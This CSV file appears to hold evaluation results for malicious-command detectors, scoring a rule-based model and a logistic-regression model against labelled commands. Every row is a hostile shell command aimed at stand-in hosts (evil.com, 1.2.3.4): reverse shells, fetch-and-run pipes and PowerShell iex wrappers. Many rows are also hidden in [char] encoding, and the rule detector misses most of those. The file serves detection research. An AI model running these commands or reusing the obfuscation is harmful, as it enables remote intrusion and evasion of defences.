command,true_label,pred_rules,pred_lr,rule_score,lr_score,obfuscation_family,shell_type,difficulty
"[char]119+[char]103+[char]101+[char]116+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]112+[char]97+[char]121+[char]108+[char]111+[char]97+[char]100+[char]46+[char]115+[char]104+[char]32+[char]45+[char]79+[char]45+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""nc -e /bin/sh 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"wget http://evil.com/payload.sh -O- | sh#!#13#9",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""nc -e /bin/sh 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"nc -e /bin/sh 1.2.3.4 4444",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""bash -i >& /dev/tcp/1.2.3.4/4444 0>&1""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"[char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108+[char]32+[char]45+[char]101+[char]110+[char]99+[char]32+[char]80+[char]65+[char]89+[char]76+[char]79+[char]65+[char]68+[char]32+[char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108+[char]32+[char]45+[char]101+[char]110+[char]99+[char]32+[char]80+[char]65+[char]89+[char]76+[char]79+[char]65+[char]68",1,0,0,0.0,0.0,unknown,unknown,unknown
"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",1,0,1,0.0,1.0,unknown,unknown,unknown
"[char]119+[char]103+[char]101+[char]116+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]112+[char]97+[char]121+[char]108+[char]111+[char]97+[char]100+[char]46+[char]115+[char]104+[char]32+[char]45+[char]79+[char]45+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""nc -e /bin/sh 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"echo hello && curl http://evil.com",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""curl http://evil.com/shell.sh | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""printf test && nc 1.2.3.4 4444 printf test && nc 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"nc -e /bin/sh 1.2.3.4 4444",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""""po""+""wershell"" -enc PAYLOAD""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]119+[char]103+[char]101+[char]116+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]112+[char]97+[char]121+[char]108+[char]111+[char]97+[char]100+[char]46+[char]115+[char]104+[char]32+[char]45+[char]79+[char]45+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"[char]98+[char]97+[char]115+[char]104+[char]32+[char]45+[char]105+[char]32+[char]62+[char]38+[char]32+[char]47+[char]100+[char]101+[char]118+[char]47+[char]116+[char]99+[char]112+[char]47+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]47+[char]52+[char]52+[char]52+[char]52+[char]32+[char]48+[char]62+[char]38+[char]49",1,0,0,0.0,0.0,unknown,unknown,unknown
"wget http://evil.com/payload.sh -O- | sh",1,1,1,1.0,1.0,unknown,unknown,unknown
"printf test && nc 1.2.3.4 4444##23",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]101+[char]99+[char]104+[char]111+[char]32+[char]104+[char]101+[char]108+[char]108+[char]111+[char]32+[char]38+[char]38+[char]32+[char]99+[char]117+[char]114+[char]108+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109",1,0,0,0.0,0.0,unknown,unknown,unknown
"[char]110+[char]99+[char]32+[char]45+[char]101+[char]32+[char]47+[char]98+[char]105+[char]110+[char]47+[char]115+[char]104+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52",1,0,0,0.0,0.0,unknown,unknown,unknown
"nc -e /bin/sh 1.2.3.4 4444",1,1,1,1.0,1.0,unknown,unknown,unknown
"wget http://evil.com/payload.sh -O- | sh0$# wget http://evil.com/payload.sh -O- | sh0$#",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""bash -i >& /dev/tcp/1.2.3.4/4444 0>&10*3^""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""curl http://evil.com/shell.sh | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]119+[char]103+[char]101+[char]116+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]112+[char]97+[char]121+[char]108+[char]111+[char]97+[char]100+[char]46+[char]115+[char]104+[char]32+[char]45+[char]79+[char]45+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""cat file.txt | base64 -d cat file.txt | base64 -d""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"""po""+""wershell"" -enc PAYLOAD",1,1,1,1.0,1.0,unknown,unknown,unknown
"printf test && nc 1.2.3.4 4444",1,1,1,1.0,1.0,unknown,unknown,unknown
"wget http://evil.com/payload.sh -O- | sh",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]98+[char]97+[char]115+[char]104+[char]32+[char]45+[char]105+[char]32+[char]62+[char]38+[char]32+[char]47+[char]100+[char]101+[char]118+[char]47+[char]116+[char]99+[char]112+[char]47+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]47+[char]52+[char]52+[char]52+[char]52+[char]32+[char]48+[char]62+[char]38+[char]49",1,0,0,0.0,0.0,unknown,unknown,unknown
"cat file.txt | base64 -d",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""cat file.txt | base64 -d""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""printf test && nc 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""printf test && nc 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"wget http://evil.com/payload.sh -O- | sh",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]112+[char]114+[char]105+[char]110+[char]116+[char]102+[char]32+[char]116+[char]101+[char]115+[char]116+[char]32+[char]38+[char]38+[char]32+[char]110+[char]99+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52",1,0,0,0.0,0.0,unknown,unknown,unknown
"[char]99+[char]117+[char]114+[char]108+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]115+[char]104+[char]101+[char]108+[char]108+[char]46+[char]115+[char]104+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"[char]99+[char]117+[char]114+[char]108+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]115+[char]104+[char]101+[char]108+[char]108+[char]46+[char]115+[char]104+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""echo hello && curl http://evil.com""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""nc -e /bin/sh 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]110+[char]99+[char]32+[char]45+[char]101+[char]32+[char]47+[char]98+[char]105+[char]110+[char]47+[char]115+[char]104+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52",1,0,0,0.0,0.0,unknown,unknown,unknown
"echo hello && curl http://evil.com",1,0,1,0.0,1.0,unknown,unknown,unknown
"[char]98+[char]97+[char]115+[char]104+[char]32+[char]45+[char]105+[char]32+[char]62+[char]38+[char]32+[char]47+[char]100+[char]101+[char]118+[char]47+[char]116+[char]99+[char]112+[char]47+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]47+[char]52+[char]52+[char]52+[char]52+[char]32+[char]48+[char]62+[char]38+[char]49",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""cat file.txt | base64 -d""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"[char]110+[char]99+[char]32+[char]45+[char]101+[char]32+[char]47+[char]98+[char]105+[char]110+[char]47+[char]115+[char]104+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52+[char]32+[char]110+[char]99+[char]32+[char]45+[char]101+[char]32+[char]47+[char]98+[char]105+[char]110+[char]47+[char]115+[char]104+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""wget http://evil.com/payload.sh -O- | sh7!%^1%&93""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
